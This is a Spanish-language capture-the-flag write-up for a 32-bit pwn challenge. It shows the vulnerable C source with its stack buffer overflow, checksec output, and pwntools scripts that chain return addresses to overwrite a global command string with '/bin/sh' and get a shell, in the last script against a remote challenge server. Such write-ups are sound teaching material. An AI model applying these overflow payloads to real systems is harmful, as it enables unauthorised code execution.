# Reto C2_Server_Pwn

## Código fuente

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char command[32];

void setup() {
  setvbuf(stdin,NULL,2,0);
  setvbuf(stdout,NULL,2,0);
  setvbuf(stderr,NULL,2,0);
}

void updateCommand(int idx, char c) {
  command[idx] = c;
}

void execCommand() {
  system(command);
}

void vuln() {
  char buffer[256];
  puts("Recibiendo datos...");

  fgets(buffer, 512, stdin);
}

int main() {
  setup();
  char* defaultCommand = "echo Datos exfiltrados\x00";

  for (int i = 0; i <= strlen(defaultCommand); i++) {
    updateCommand(i, defaultCommand[i]);
  }

  puts("Servicio de exfiltracion Ocelot v0.1");

  vuln();
  execCommand();
}
```

## Writeup
Comenzamos lanzando checksec para ver información del binario.

```
$ pwn checksec chal
[*] '/home/donas/Documentos/hackdef/pwn/archivos/chal'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Observamos que el binario está compilado en 32 bits y no tiene canary ni PIE habilitados. Para ejecutarlo debemos asegurarnos de que tenemos soporte para 32 bits. (Para sistemas de 64 bits, instalar gcc-multilib).

Lo primero que podemos observar es que el programa ejecuta la función system() utilizando como argumento una variable global `command` y que existe una función `updateCommand` que escribe un caracter `c` en la posición `idx` del comando.

Lo segundo que observamos es que la función vuln tiene un buffer overflow.

```c
void vuln() {
  char buffer[256];
  puts("Recibiendo datos...");

  fgets(buffer, 512, stdin);
}
```

El buffer tiene un tamaño de 256 y se están leyendo 512 bytes, por lo que el overflow es de 256 bytes.

Debido a que el binario no tiene canary, podemos explotar el buffer overflow directamente.

Con esta información podemos empezar a armar el exploit. Nuestro objetivo es cambiar el contenido de `command` para que ejecute un comando de nuestra elección, como `/bin/sh`.

Comenzamos con un script simple para explotar el buffer overflow.

```python
from pwn import *

vuln = ELF("./chal")

p = process("./chal")

payload = b"A" * 0x10c
payload += p32(vuln.symbols["execCommand"])
p.sendlineafter(b"...", payload)

p.interactive()
```

Sobreescribimos el return address de vuln para que ejecute `execCommand`.

```python
python3 solve.py
[*] '/home/donas/Documentos/hackdef/pwn/archivos/chal'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './chal': pid 53832
[*] Switching to interactive mode

Datos exfiltrados
```

Observamos que funciona correctamente.

Ahora, para cambiar el comando, debemos usar el buffer overflow para ejecutar la función `updateCommand`. Veamos el código de esta función.

```c
void updateCommand(int idx, char c) {
  command[idx] = c;
}
```

Esta función recibe 2 argumentos, por lo que tenemos que ver cómo pasarle argumentos de nuestra elección con el buffer overflow.

Recordemos que el binario fue compilado en 32 bits, por lo que las funciones reciben argumentos a través del [stack](https://aaronbloomfield.github.io/pdr/book/x86-32bit-ccc-chapter.pdf).

Modificamos el script para ejecutar `updateCommand(5, 'Z')` y `execCommand`. De esta forma, cambiaremos el comando de `echo Datos exfiltrados` a `echo Zatos exfiltrados`.

```python
from pwn import *

vuln = ELF("./chal")

p = process("./chal")

payload = b"A" * 0x10c
payload += p32(vuln.symbols["updateCommand"]) # return address de vuln
payload += p32(vuln.symbols["execCommand"])   # return address de updateCommand
payload += p32(5)                             # arg1
payload += p32(ord('Z'))                      # arg2
p.sendlineafter(b"...", payload)

p.interactive()
```

En este script el flujo es:
- main()
- vuln()
- updateCommand(5, 'Z')
- execCommand()

```
$ python3 solve.py
[*] '/home/donas/Documentos/hackdef/pwn/archivos/chal'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './chal': pid 54276
[*] Switching to interactive mode

Zatos exfiltrados
```

Observamos que el comando se editó correctamente, y el programa nos muestra el mensaje `Zatos exfiltrados`.

Pero este script solo nos deja cambiar un solo caracter, por lo que debemos explotar el buffer overflow varias veces para cambiar más letras del comando. Para hacerlo, debemos hacer que al terminar `updateCommand`, se ejecute `vuln` para tener otra oportunidad de explotar el buffer overflow.

El flujo final sería:

- main()
- vuln()
- updateCommand(0, '/')
- vuln()
- updateCommand(1, 'b')
- vuln()
- updateCommand(2, 'i')
- ....
- vuln()
- execCommand()

```python
from pwn import *

vuln = ELF("./chal")

# p = process("./chal")
p = remote("35.95.31.64", 3000)

for i, c in enumerate(b"/bin/sh;"):
    payload = b"A" * 0x10c
    payload += p32(vuln.symbols["updateCommand"])
    payload += p32(vuln.symbols["vuln"])
    payload += p32(i)
    payload += p32(c)

    p.sendlineafter(b"...", payload)

payload = b"A" * 0x10c
payload += p32(vuln.symbols["execCommand"])
p.sendlineafter(b"...", payload)

p.interactive()
```

```
$ python3 win.py
[*] '/home/donas/Documentos/hackdef/pwn/archivos/chal'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './chal': pid 54437
[*] Switching to interactive mode

$ echo pwned
pwned
```
